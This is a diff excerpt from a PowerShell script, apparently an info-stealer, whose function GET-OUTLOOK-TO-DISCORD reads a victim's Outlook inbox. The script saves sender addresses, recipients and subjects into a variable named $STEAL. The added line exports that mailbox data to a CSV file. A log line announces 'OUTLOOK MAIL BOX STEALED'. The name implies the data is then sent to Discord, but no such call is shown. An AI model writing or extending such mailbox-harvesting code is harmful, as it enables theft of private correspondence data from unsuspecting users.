@@ -33,6 +33,9 @@ Function GET-OUTLOOK-TO-DISCORD{
   $inbox = $mapi.GetDefaultFolder($olFolderInbox)
   $STEAL = $inbox.items|Select SenderEmailAddress,to,subject|Format-Table -AutoSize 
  
+  $inbox.items|Select SenderEmailAddress,to,subject|Format-Table -AutoSize |Export-Csv $BSave -NoTypeInformation
+ 
+ 
   Log-Message " [*] OUTLOOK MAIL BOX STEALED ------------------- ELMO9AWIM "
 
 
